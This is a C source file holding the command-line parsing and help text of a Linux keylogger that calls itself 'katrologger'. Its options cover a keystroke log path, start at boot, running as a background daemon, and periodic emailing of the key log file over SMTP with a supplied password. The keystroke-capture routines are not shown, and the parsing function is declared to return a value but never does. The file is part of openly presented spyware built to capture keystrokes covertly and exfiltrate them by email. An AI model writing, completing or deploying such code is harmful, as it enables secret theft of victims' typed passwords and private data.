#include "usage.h"

int flag_kill = 0;
int flag_smtp = 0;
int flag_status = 0;
int smtp_status = 0;
int no_bootable = 0;
int no_daemon = 0;

void usage() {
    printf("Parameters:\n");
    printf("\t-o, --output       file path\n");
    printf("\t-k, --kill         stop\n");
    printf("\t-s, --status       status\n");
    printf("\t--no-bootable      disable automatic startup\n");
    printf("\t--no-daemon        no background process will be created\n");
    printf("\t-h, --help         help\n");

    printf("\nSend Mail (libquickmail):\n");
    printf("\t--smtp-status      email status\n");
    printf("\t--smtp-url         SMTP server\n");
    printf("\t--smtps-url        SMTPS server\n");
    printf("\t--port             SMTP port\n");
    printf("\t--mail-from        source email\n");
    printf("\t--pass             password email\n");
    printf("\t--mail-rcpt        receipt email\n");
    printf("\t--smtp-file        key log file attachment\n");
    printf("\t--time             time intervall, --time 1-60 (minutes)\n");

    printf("\nUsage:\n\tkatrologger --output /var/log/<file>\n");
    exit(0);
}

int keylogger_usage(int argc, char **argv) {

  int opt;

struct option long_options[] = {
  {"help",   no_argument,          0, 'h'},
  {"output", required_argument,    0, 'o'},
  {"kill",   no_argument,          0, 'k'},
  {"status", no_argument,          0, 's'},
  {"smtp-status", no_argument,     0,  1 },
  {"no-bootable", no_argument,     0,  2 },
  {"no-daemon", no_argument,       0,  3 },
  {"smtp-url",  required_argument, 0,  0 },
  {"smtps-url", required_argument, 0,  0 },
  {"mail-from", required_argument, 0,  0 },
  {"mail-rcpt", required_argument, 0,  0 },
  {"port", required_argument,      0,  0 },
  {"pass", required_argument,      0,  0 },
  {"smtp-file", required_argument, 0,  0 },
  {"time", required_argument,      0,  0 },
  {0, 0, 0, 0}
};

if (argc < 2)
  usage();

while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
  switch (opt) {
    case 0:
        if (argc == 15) {
          flag_smtp = 1;
        } else {
          printf("[x] Required arguments for send mail ...\n"); exit(1);
        }
      break;
    case 1:
        smtp_status = 1;
      break;
    case 2:
        no_bootable = 1;
      break;
    case 3:
        no_daemon = 1;
      break;
    case 'h':
        usage();
      break;
    case 'o':
        strncpy(outfile, optarg, 199);
      break;
    case 'k':
        flag_kill = 1;
      break;
    case 's':
        flag_status = 1;
        break;
    case '?':
      fprintf(stderr, "Invalid Argument => -%c\n", optopt);
      exit(1);
    default :
        fprintf(stderr, "!!! No Arguments !!!\n");
        exit(1);
      }
    }
}
